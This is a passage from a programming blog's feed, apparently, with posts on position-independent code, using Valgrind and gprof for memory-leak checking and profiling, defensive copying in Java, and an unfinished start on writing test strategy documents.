    <summary type="html">&lt;p&gt;In &lt;a href=&quot;https://www.wikiwand.com/en/Computing&quot;&gt;computing&lt;/a&gt;, &lt;strong&gt;position-independent code&lt;/strong&gt; (&lt;strong&gt;PIC&lt;/strong&gt;) or &lt;strong&gt;position-independent executable&lt;/strong&gt; (&lt;strong&gt;PIE&lt;/strong&gt;) is a body of &lt;a href=&quot;https://www.wikiwand.com/en/Machine_code&quot;&gt;machine code&lt;/a&gt; that, being placed somewhere in the &lt;a href=&quot;https://www.wikiwand.com/en/Primary_memory&quot;&gt;primary memory&lt;/a&gt;, executes properly regardless of its &lt;a href=&quot;https://www.wikiwand.com/en/Absolute_address&quot;&gt;absolute address&lt;/a&gt;.&lt;/p&gt;</summary>
    
    
    
    <category term="计算机系统" scheme="https://www.fvolcano.red/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>程序性能分析工具Valgrind和gprof的使用</title>
    <link href="https://www.fvolcano.red/2021/how-to-use-valgrind-and-gprof/"/>
    <id>https://www.fvolcano.red/2021/how-to-use-valgrind-and-gprof/</id>
    <published>2021-05-28T12:03:41.000Z</published>
    <updated>2021-05-28T12:03:41.000Z</updated>
    
    <content type="html"><![CDATA[<p>程序的性能分析在判断问题和改进代码上作用很大，Valgrind和gprof是两个很有用的分析工具。</p><a id="more"></a><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://www.howtoing.com/how-to-install-and-use-profiling-tool-gprof">如何在Linux上安装和使用分析工具Gprof</a></li><li><a href="https://www.thegeekstuff.com/2012/08/gprof-tutorial/">GPROF Tutorial – How to use Linux GNU GCC Profiling Tool</a></li><li><a href="https://blog.csdn.net/stanjiang2010/article/details/5655143">Linux性能评测工具之一：gprof篇</a></li><li><a href="https://zhuanlan.zhihu.com/p/149800013">valgrind诊断C/C++内存泄漏</a></li><li><a href="https://blog.csdn.net/tissar/article/details/87194737">Valgrind详细教程（1） Memcheck</a></li><li><a href="https://www.cprogramming.com/debugging/valgrind.html">Using Valgrind to Find Memory Leaks and Invalid Memory Use</a></li></ol><h1 id="Valgrind"><a href="#Valgrind" class="headerlink" title="Valgrind"></a>Valgrind</h1><p><a href="http://www.it.uc3m.es/pbasanta/asng/course_notes/memory_profiler_en.html#memcheck_tool">官方文档</a></p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>C/C++中内存分配与管理是程序员比较头疼的事情，大型线上业务系统，系统内存泄漏到一定程序，可能会因为分配不到内存而导致宕机，后果很严重。</p><p>valgrind工具大件提供了许多调试和性能分析工具，包含包含七个生产质量工具：一个<strong>内存错误检测器</strong>，两个线程错误检测器，一个缓存和分支预测探查器，一个生成调用图的缓存和分支预测探查器以及两个不同的堆探查器。还包括一个实验性的SimPoint基本块矢量生成器。</p><p>这些工具中最流行的称为Memcheck。它可以检测C和C++程序中常见的许多与内存相关的错误，这些错误可能导致崩溃和不可预测的行为。实际上memcheck使用<strong>它自己的内存分配代替标准</strong>C中的内存分配（malloc和free），因此可以检测出一些异常信息。</p><p>Memcheck是Valgrind的王牌，它用于C/C++程序的内存错误检测：</p><ol><li>非法访问内存（堆、栈、内存段错误）</li><li>引用未初始化的变量</li><li>非法释放对内存（重复释放、释放与申请不匹配）</li><li>内存重叠错误</li><li>内存泄露</li><li>错误地申请内存</li><li>内存树的分析</li></ol><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -g -o main_c main.c</span><br><span class="line">valgrind --tool=memcheck --leak-check=full ./main_c</span><br></pre></td></tr></table></figure><p>–tools=memcheck表示使用memcheck工具，valgrind默认的工具也是这个，加不加都可以。</p><h2 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h2><ul><li><p>HEAP SUMMARY，它表示程序在堆上分配内存的情况，2 allocs表示分配了2次内存，0 frees表示释放了0次，72,714 bytes allocated表示分配了72,714个字节</p></li><li><p>如果有泄漏，valgrind会报告是哪个位置发生了泄漏（main中cpp第8行）</p></li><li><p>LEAK SUMMARY，表示不同的内存丢失类型</p></li><li><ul><li>definitely loss: 确认丢失，<strong>需修复</strong>因为在程序运行完的时候，没有指针指向它，指向它的指针在程序中丢失了；</li><li>indirectly lost: 间接丢失，<strong>无须处理</strong>，当使用了含有指针成员的类或结构时可能会报这个错误。这类错误无需直接修复，他们总是与”definitely lost”一起出现，只要修复”definitely lost”即可；</li><li>possibly lost: 可能丢失，<strong>需修复</strong>，发现了一个指向某块内存中部的指针，而不是指向内存块头部。这种指针一般是原先指向内存块头部，后来移动到了内存块的中部，还有可能该指针和该内存根本就没有关系，检测工具只是怀疑有内存泄漏。</li><li>still reachable: 可以访问，需修复，未丢失但也未释放。如果程序是正常结束的，那么它可能不会造成程序崩溃。表示泄漏的内存在程序运行完的时候，仍旧有指针指向它，因而，这种内存在程序运行结束之前可以释放。一般情况下valgrind不会报这种泄漏，除非使用了参数 –show-reachable=yes。</li><li>suppressed：已被解决，<strong>无须处理</strong>，出现了内存泄露但系统自动处理了；可以无视这类错误。</li></ul></li></ul><h1 id="gprof"><a href="#gprof" class="headerlink" title="gprof"></a>gprof</h1><p><a href="https://ftp.gnu.org/old-gnu/Manuals/gprof-2.9.1/html_node/gprof_toc.html">官方文档</a></p><h2 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h2><p>gprof 是GNU gnu binutils工具之一，默认情况下linux系统当中都带有这个工具。</p><p>它实际上只是一个用于读取profile结果文件的工具。它采用混合方法来收集程序的统计信息，使用检测方法，在编译过程中在函数入口处插入计数器用于收集每个函数的被调用情况和被调用次数；也使用采样方法，在运行时按一定间隔去检查程序计数器并在分析时找出程序计数器对应的函数来统计函数占用的时间。</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>通过在编译和链接程序的时候（使用 -pg 编译和链接选项），gcc 在你应用程序的每个函数中都加入了一个名为mcount ( or  “_mcount”  , or  “__mcount” , 依赖于编译器或操作系统)的函数，也就是说你的应用程序里的每一个函数都会调用mcount, 而mcount 会在内存中保存一张函数调用图，并通过函数调用堆栈的形式查找子函数和父函数的地址。这张调用图也保存了所有与函数相关的调用时间，调用次数等等的所有信息。</p><h2 id="使用流程"><a href="#使用流程" class="headerlink" title="使用流程"></a>使用流程</h2><ol><li><p>在编译和链接时 加上-pg选项。一般我们可以加在 makefile 中。</p></li><li><p>执行编译的二进制程序。执行参数和方式同以前。</p></li><li><p>在程序运行目录下 生成 gmon.out 文件。如果原来有gmon.out 文件，将会被重写。</p></li><li><p>结束进程。这时 gmon.out 会再次被刷新。</p></li><li><p>用 gprof 工具分析 gmon.out 文件。</p></li></ol><p>一系列完整的使用命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -Wall -std=c99 -pg test_gprof.c -o test_gprof</span><br><span class="line">./test_gprof</span><br><span class="line">gprof test_gprof gmon.out &gt; profile-data.txt</span><br></pre></td></tr></table></figure><h2 id="输出信息"><a href="#输出信息" class="headerlink" title="输出信息"></a>输出信息</h2><p>Gprof生成的可读输出分为两部分：平面配置文件和调用图。以下是Gprof的手册页面关于这两个部分的信息：</p><p>“平面配置文件显示了您的程序在每个功能中花费了多少时间，以及调用多少次功能。如果您只想知道哪些功能可以烧录大部分的周期，那么这里就简明扼要。”</p><p>“调用图显示了对于每个函数，调用哪个函数，它调用了哪些其他函数，以及多少次。还有一个估计是在每个函数的子例程中花费了多少时间，这可以建议你所在的地方可能会尝试消除使用大量时间的函数调用。”</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Flat profile:</span><br><span class="line"></span><br><span class="line">Each sample counts as 0.01 seconds.</span><br><span class="line"><span class="meta"> %</span><span class="bash">    cumulative self           self    total </span></span><br><span class="line"> time seconds    seconds calls  ms/call ms/call  name </span><br><span class="line"> 96.43 0.81      0.81      1    810.00  810.00   func3</span><br><span class="line"> 3.57 0.84       0.03      1    30.00   840.00   func1</span><br><span class="line"> 0.00 0.84       0.00      1    0.00    810.00   func2</span><br><span class="line"> 0.00 0.84       0.00      1    0.00    0.00     func4</span><br><span class="line"> </span><br><span class="line"> Call graph (explanation follows)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">granularity: each sample hit covers 4 byte(s) for 1.19% of 0.84 seconds</span><br><span class="line"></span><br><span class="line">index % time self children called name</span><br><span class="line">             0.03 0.81     1/1       main [2]</span><br><span class="line">[1]    100.0 0.03 0.81      1     func1 [1]</span><br><span class="line">             0.00 0.81     1/1       func2 [3]</span><br><span class="line">-----------------------------------------------</span><br><span class="line">                                     &lt;spontaneous&gt;</span><br><span class="line">[2]    100.0 0.00 0.84            main [2]</span><br><span class="line">             0.03 0.81     1/1       func1 [1]</span><br><span class="line">             0.00 0.00     1/1       func4 [5]</span><br><span class="line">-----------------------------------------------</span><br><span class="line">             0.00 0.81     1/1       func1 [1]</span><br><span class="line">[3]    96.4  0.00 0.81      1     func2 [3]</span><br><span class="line">             0.81 0.00     1/1       func3 [4]</span><br><span class="line">-----------------------------------------------</span><br><span class="line">             0.81 0.00     1/1       func2 [3]</span><br><span class="line">[4]    96.4  0.81 0.00      1      func3 [4]</span><br><span class="line">-----------------------------------------------</span><br><span class="line">             0.00 0.00     1/1       main [2]</span><br><span class="line">[5]    0.0   0.00 0.00      1      func4 [5]</span><br></pre></td></tr></table></figure><p><img src="/2021/how-to-use-valgrind-and-gprof/gprof-flat-profile.png" alt="img"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;程序的性能分析在判断问题和改进代码上作用很大，Valgrind和gprof是两个很有用的分析工具。&lt;/p&gt;</summary>
    
    
    
    <category term="工具" scheme="https://www.fvolcano.red/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>defensive copying 的为什么和怎么做</title>
    <link href="https://www.fvolcano.red/2021/how-to-implement-with-defensive-copying/"/>
    <id>https://www.fvolcano.red/2021/how-to-implement-with-defensive-copying/</id>
    <published>2021-05-27T13:59:57.000Z</published>
    <updated>2021-05-27T13:59:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>defensive copying(保护性拷贝)是在软件实现中常会用到的概念，这篇博客主要介绍为什么需要 defensive copy 和如何实现 defensive copying。</p><a id="more"></a><h2 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h2><ol><li><a href="https://www.baeldung.com/autovalue-defensive-copies">Defensive Copies for Collections Using AutoValue</a></li><li><a href="http://www.javapractices.com/topic/TopicAction.do?Id=15">Defensive copying</a></li><li><a href="https://www.wikiwand.com/en/Object_copying">Object copying-wiki</a></li></ol><h1 id="为什么"><a href="#为什么" class="headerlink" title="为什么"></a>为什么</h1><p>A class may have a mutable object as a field. There are two possible cases for how the state of a mutable object field can change:</p><ul><li>its state can be changed only by the native class - the native class <em>creates</em> the mutable object field, and is the only class which is directly aware of its existence</li><li>its state can be changed both by the native class and by its callers - the native class simply <em>points</em> to a mutable object which was created elsewhere</li></ul><p>Both cases are valid design choices, but you must be aware of which one is appropriate for each case.</p><p>If the mutable object field’s state should be changed only by the native class, then a <em>defensive copy</em> of the mutable object <em>must</em> be made any time it’s passed into (constructors and <code>set</code> methods) or out of (<code>get</code> methods) the class. If this is <em>not</em> done, then it’s simple for the caller to break encapsulation, by changing the state of an object which is simultaneously visible to <em>both</em> the class and its caller.</p><h2 id="参数引用"><a href="#参数引用" class="headerlink" title="参数引用"></a>参数引用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;String&gt; favoriteMovies;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// accessors, constructor, toString, equals, hashcode omitted</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> favoriteMovies = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">favoriteMovies.add(<span class="string">&quot;Clerks&quot;</span>); <span class="comment">// fine</span></span><br><span class="line"><span class="keyword">var</span> person = <span class="keyword">new</span> Person(<span class="string">&quot;Katy&quot;</span>, favoriteMovies);</span><br><span class="line">favoriteMovies.add(<span class="string">&quot;Dogma&quot;</span>); <span class="comment">// oh, no!</span></span><br></pre></td></tr></table></figure><h2 id="返回值引用"><a href="#返回值引用" class="headerlink" title="返回值引用"></a>返回值引用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EmailMessage msg = ...</span><br><span class="line">Date d = msg.getDate();</span><br><span class="line">d.setTime(d.getTime()+<span class="number">12345</span>); <span class="comment">// Changes the date inside msg</span></span><br></pre></td></tr></table></figure><h1 id="怎么做"><a href="#怎么做" class="headerlink" title="怎么做"></a>怎么做</h1><p>defensive copying 有时候也被叫做 “object copying”，从这个名字可以看出它的做法——拷贝一个对象。</p><h2 id="参数保护"><a href="#参数保护" class="headerlink" title="参数保护"></a>参数保护</h2><p>Because Java’s standard collection types may be mutable, the immutable <em>Person</em> type must protect itself from callers who would modify the <em>favoriteMovies</em> list after creating a new <em>Person</em>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name, List&lt;String&gt; favoriteMovies)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.favoriteMovies = List.copyOf(favoriteMovies);</span><br><span class="line">    <span class="comment">// or </span></span><br><span class="line">    <span class="comment">// this.favoriteMovies = Collections.unmodifiableList(new ArrayList&lt;&gt;(favoriteMovies));</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The <em>Person</em> class must make a defensive copy of the <em>favoriteMovies</em> collection. By doing so, the <em>Person</em> class captures the state of the <em>favoriteMovies</em> list as it existed when the <em>Person</em> was created.</p><h2 id="返回值保护"><a href="#返回值保护" class="headerlink" title="返回值保护"></a>返回值保护</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Date <span class="title">getDate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Date(date.getTime());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="完整示例类"><a href="#完整示例类" class="headerlink" title="完整示例类"></a>完整示例类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Planet is an immutable class, since there is no way to change</span></span><br><span class="line"><span class="comment">* its state after construction.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Planet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Planet</span> <span class="params">(<span class="keyword">double</span> mass, String name, Date dateOfDiscovery)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">this</span>.mass = mass;</span><br><span class="line">     <span class="keyword">this</span>.name = name;</span><br><span class="line">     <span class="comment">//make a private copy of aDateOfDiscovery</span></span><br><span class="line">     <span class="comment">//this is the only way to keep the fDateOfDiscovery</span></span><br><span class="line">     <span class="comment">//field private, and shields this class from any changes that </span></span><br><span class="line">     <span class="comment">//the caller may make to the original aDateOfDiscovery object</span></span><br><span class="line">     <span class="keyword">this</span>.dateOfDiscovery = <span class="keyword">new</span> Date(dateOfDiscovery.getTime());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a primitive value.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * The caller can do whatever they want with the return value, without </span></span><br><span class="line"><span class="comment">  * affecting the internals of this class. Why? Because this is a primitive </span></span><br><span class="line"><span class="comment">  * value. The caller sees its &quot;own&quot; double that simply has the</span></span><br><span class="line"><span class="comment">  * same value as fMass.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getMass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> mass;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns an immutable object.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * The caller gets a direct reference to the internal field. But this is not </span></span><br><span class="line"><span class="comment">  * dangerous, since String is immutable and cannot be changed.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> name;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  /**</span></span><br><span class="line"><span class="comment">//  * Returns a mutable object - likely bad style.</span></span><br><span class="line"><span class="comment">//  *</span></span><br><span class="line"><span class="comment">//  * The caller gets a direct reference to the internal field. This is usually dangerous, </span></span><br><span class="line"><span class="comment">//  * since the Date object state can be changed both by this class and its caller.</span></span><br><span class="line"><span class="comment">//  * That is, this class is no longer in complete control of dateOfDiscovery.</span></span><br><span class="line"><span class="comment">//  */</span></span><br><span class="line"><span class="comment">//  public Date getDateOfDiscovery() &#123;</span></span><br><span class="line"><span class="comment">//    return dateOfDiscovery;</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Returns a mutable object - good style.</span></span><br><span class="line"><span class="comment">  * </span></span><br><span class="line"><span class="comment">  * Returns a defensive copy of the field.</span></span><br><span class="line"><span class="comment">  * The caller of this method can do anything they want with the</span></span><br><span class="line"><span class="comment">  * returned Date object, without affecting the internals of this</span></span><br><span class="line"><span class="comment">  * class in any way. Why? Because they do not have a reference to </span></span><br><span class="line"><span class="comment">  * fDate. Rather, they are playing with a second Date that initially has the </span></span><br><span class="line"><span class="comment">  * same data as fDate.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> Date <span class="title">getDateOfDiscovery</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Date(dateOfDiscovery.getTime());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// PRIVATE</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * Final primitive data is always immutable.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">double</span> mass;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * An immutable object field. (String objects never change state.)</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> String name;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">  * A mutable object field. In this case, the state of this mutable field</span></span><br><span class="line"><span class="comment">  * is to be changed only by this class. (In other cases, it makes perfect</span></span><br><span class="line"><span class="comment">  * sense to allow the state of a field to be changed outside the native</span></span><br><span class="line"><span class="comment">  * class; this is the case when a field acts as a &quot;pointer&quot; to an object</span></span><br><span class="line"><span class="comment">  * created elsewhere.)</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  * java.util.Date is used here only because its convenient for illustrating </span></span><br><span class="line"><span class="comment">  * a point about mutable objects. In new code, you should use </span></span><br><span class="line"><span class="comment">  * java.time classes, not java.util.Date.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> Date dateOfDiscovery;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="关于深浅拷贝的解释"><a href="#关于深浅拷贝的解释" class="headerlink" title="关于深浅拷贝的解释"></a>关于深浅拷贝的解释</h1><h3 id="Shallow-copy"><a href="#Shallow-copy" class="headerlink" title="Shallow copy"></a>Shallow copy</h3><p>One method of copying an object is the <em>shallow copy</em>. In that case a new object B is <a href="https://www.wikiwand.com/en/Object_creation">created</a>, and the fields values of A are copied over to B. This is also known as a <em>field-by-field copy</em>, <em>field-for-field copy</em>, or <em>field copy</em>. If the field value is a reference to an object (e.g., a memory address) it copies the reference, hence referring to the same object as A does, and if the field value is a primitive type it copies the value of the primitive type. In languages without primitive types (where everything is an object), all fields of the copy B are references to the same objects as the fields of original A. The referenced objects are thus <em>shared</em>, so if one of these objects is modified (from A or B), the change is visible in the other. Shallow copies are simple and typically cheap, as they can be usually implemented by simply copying the bits exactly.</p><h3 id="Deep-copy"><a href="#Deep-copy" class="headerlink" title="Deep copy"></a>Deep copy</h3><p>A deep copy in progress.</p><p><img src="/2021/how-to-implement-with-defensive-copying/400px-Deep_copy_in_progress.svg.png" alt="img"></p><p>A deep copy having been completed.</p><p><img src="/2021/how-to-implement-with-defensive-copying/400px-Deep_copy_done.svg.png" alt="img"></p><p>An alternative is a deep copy, meaning that fields are dereferenced: rather than references to objects being copied, new copy objects are created for any referenced objects, and references to these placed in B. The result is different from the result a shallow copy gives in that the objects referenced by the copy B are distinct from those referenced by A, and independent. Deep copies are more expensive, due to needing to create additional objects, and can be substantially more complicated, due to references possibly forming a complicated graph.</p><p>Deep copy is a process in which the copying process occurs recursively. It means first constructing a new collection object and then recursively populating it with copies of the child objects found in the original. In case of deep copy, a copy of object is copied in other object. It means that any changes made to a copy of object do not reflect in the original object. In python, this is implemented using “deep copy()” function.</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>传递引用要谨慎，若该类中的某个字段是mutable类型，但需求为不能更改，那么应该在字段前加上final修饰，且在构造器和getter、setter中传送的应该是该字段的拷贝。</p><p>Defensive copying helps encapsulation as it mitigates escape of fields through the getters methods. Defensive copying creates a copy every time and thus you can end up with too many copying of something. This can strain the memory management (the garbage collector) and can have a negative effects on the whole application performance. With that said, it is quite effective and simple to implement. Prevention is better than cure, but in cases where we cannot change the types, defensive copying can step in and save the day.</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;defensive copying(保护性拷贝)是在软件实现中常会用到的概念，这篇博客主要介绍为什么需要 defensive copy 和如何实现 defensive copying。&lt;/p&gt;</summary>
    
    
    
    <category term="SoftwareConstruction" scheme="https://www.fvolcano.red/categories/SoftwareConstruction/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>how to write Test Strategy document</title>
    <link href="https://www.fvolcano.red/2021/how-to-write-test-strategy-document/"/>
    <id>https://www.fvolcano.red/2021/how-to-write-test-strategy-document/</id>
    <published>2021-05-27T13:59:15.000Z</published>
    <updated>2021-05-27T13:59:15.000Z</updated>
    
    <content type="html"><![CDATA[<p>Test strategy means “How you are going to test the application”. It deals with test objectives, approach, test environment, automation strategy and tools, and risk analysis with a contingency plan.</p><a id="more"></a><p>参考资料：</p><ol><li><a href="https://www.softwaretestinghelp.com/writing-test-strategy-document-template/#:~:text=%20Simple%20Tips%20To%20Write%20Test%20Strategy%20Document,project.%20Clearly%2C%20mention%20what%20types%20of...%20More">How To Write Test Strategy Document (With Sample Test Strategy Template)</a></li><li><a href="http://tryqa.com/what-is-test-strategy-types-of-strategies-with-examples/">What is Test Strategy? Types of strategies with examples</a></li><li><a href="https://testfort.com/blog/7-steps-to-develop-good-test-strategy-document">7 Steps to Develop Good Test Strategy Document</a></li><li><a href="https://www.softwaretestinghelp.com/how-to-write-test-plan-document-software-testing-training-day3/">Test Plan Tutorial: A Guide To Write A Software Test Plan Document From Scratch</a></li></ol><h1 id="What"><a href="#What" class="headerlink" title="What"></a>What</h1><p>Test strategy means “How you are going to test the application?” You need to mention the exact process/strategy that you are going to follow when you will get the application for testing.</p><p>test strategy defines guidelines for test approach to be followed in order to achieve the test objectives and execution of test types defined in the testing plan. It deals with test objectives, approach, test environment, automation strategy and tools, and risk analysis with a contingency plan.</p><h1 id="How"><a href="#How" class="headerlink" title="How"></a>How</h1><h2 id="Sections-of-test-strategy-document"><a href="#Sections-of-test-strategy-document" class="headerlink" title="Sections of test strategy document"></a>Sections of test strategy document</h2><ol><li><strong>Scope and overview</strong><br>This stage is fundamental as it shapes testing company’s vision. It includes:<ul><li>dividing roles and responsibilities, deciding who should approve, review and use this document;</li><li>defining phases of each project according to the timelines that are specified in the test plan.</li></ul></li><li><strong>Test Approach</strong><br>This step should be well-thought to avoid further mess in case something goes wrong. The main points to be considered at this stage are:<ul><li>testing process and life cycle;</li><li>distribution of responsibilities among the team of QA engineers;</li><li>defining all testing types that company can provide the client with;</li><li>establishing testing approaches.</li></ul></li><li><strong>Test environment</strong><br>This stage of Test Strategy document has to cover the next aspects regarding test data:<ul><li>requirements – the clear instruction on how to create test data;</li><li>environments and all required setups for each of them;</li><li>backup and restore strategy to make sure you won’t lose any data due to some unexpected code issues.</li></ul></li><li><strong>Testing tools</strong><br>At this point you need to choose all the tools that will be used for test execution. All commercial, open source, automation and management tools have to be listed here.</li><li><strong>Realese</strong><br>To ensure successful test execution, make sure your release management plan is created thoughtfully. Thus, set a build management process to know where new build should be available, when it’s going to be deployed, who should deploy it, how to stop release in case of issues, etc.</li><li><strong>Industry standards to follow</strong></li><li><strong>Test deliverables</strong></li><li><strong>Testing metrics</strong></li><li><strong>Requirement Traceability Matrix</strong></li><li><strong>Risk and mitigation</strong><br>Try to foresee all possible risks related to your project. Write a clear plan to avoid such risks and a contingency plan in case these risks become a 